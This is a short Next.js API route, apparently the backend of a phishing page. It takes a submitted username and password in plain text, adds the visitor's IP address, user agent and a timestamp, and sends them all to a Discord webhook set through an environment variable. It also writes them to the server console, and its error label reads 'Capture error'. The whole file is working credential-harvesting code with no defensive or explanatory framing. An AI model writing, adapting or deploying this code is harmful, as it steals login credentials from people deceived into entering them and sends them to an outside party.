import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const formData = await request.formData()
    const username = formData.get('username') as string
    const password = formData.get('password') as string
    const ip = request.headers.get('x-forwarded-for') || request.ip || 'Unknown'
    const userAgent = request.headers.get('user-agent') || 'Unknown'
    const timestamp = new Date().toISOString()

    const logData = {
      content: `[${timestamp}] IP: ${ip} | UA: ${userAgent} | Username: ${username} | Password: ${password}`
    }

    // Send to Discord webhook (set DISCORD_WEBHOOK_URL in Vercel env vars)
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL
    if (webhookUrl) {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(logData),
      })
    }

    // Optional: Log to Vercel console
    console.log(logData.content)

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('Capture error:', error)
    return NextResponse.json({ success: false }, { status: 500 })
  }
}